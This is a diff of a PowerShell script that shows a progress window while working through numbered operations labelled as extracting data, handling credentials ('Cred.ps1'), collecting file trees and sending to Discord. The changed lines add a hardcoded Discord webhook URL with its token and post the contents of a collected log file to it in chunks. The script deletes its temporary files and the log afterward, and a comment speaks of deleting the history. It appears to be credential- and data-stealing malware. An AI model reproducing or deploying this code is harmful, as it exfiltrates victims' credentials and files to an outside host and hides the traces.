@@ -203,7 +203,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Done operation 2!"
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps
 
-            Write-Output "Completed Operation 2 Started the executable"
+            Write-Output "Completed Operation " + $step + "/" + $totalSteps + "Started the executable"
         }
         2 {
             # Operation 3 - EXTRACT DATA 
@@ -226,10 +226,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Start-Sleep -Seconds 2 # Wait a moment for the file to save
             Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
-            $textBlock.Text = "Done operation 3"
+            $textBlock.Text = "Done Operation " + $step
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
 
-            Write-Output "Completed Operation 3 - data saved"
+            Write-Output "Completed Operation " + $step + "- data saved"
         }
         3 {
             # Operation 4 - SEND TO DISCORD
@@ -294,9 +294,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
             #Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
-            $textBlock.Text = "Done operation 4..."
+            $textBlock.Text = "Done Operation " + $step
             $textBlock.Text = "Starting last operation ..."
-            Write-Output "Completed Operation 4 - CRED done"
+            Write-Output "Completed Operation " + $step + "- CRED done"
         }
         5 {
             #Operation 5 - TREE Files Extract
@@ -438,6 +438,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             # [System.Windows.MessageBox]::Show('tree finish!', 'Notification')
         }
         6 {
+            # Define the webhook URL
+            $logs_webhookUrl='https://discord.com/api/webhooks/1300717354547806219/1JCd4_69saQaBJrxNJJbDn-oC_VKJDj_-UYfn8tC3qu1hAzsgetWQ00cPOcHoTcmANhL'
+
             #SEND THE LOG FILE
             # Define the path to the text file using the TEMP environment variable
             $filePath = "$env:TEMP\Ain1_log.txt"
@@ -452,8 +455,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     # Send the entire content to the Discord webhook
                     $payload = @{
                         content = $fileContent
-                    } | ConvertTo-Json
-                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                    } | ConvertTo-Json -Depth 10
+                    Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                     $progressBar.Value = 100  # Set progress to complete
                 } else {
                     # Split the content into chunks of 2000 characters
@@ -473,11 +476,11 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         # Create the payload for the webhook
                         $payload = @{
                             content = $chunk
-                        } | ConvertTo-Json
+                        } | ConvertTo-Json -Depth 10
     
                         # Try to send the content to the Discord webhook
                         try {
-                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                            Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                         } catch {
                             Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
@@ -502,7 +505,6 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
             }
             $textBlock.Text = "Log sent!"
-
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
             #delete the entire history
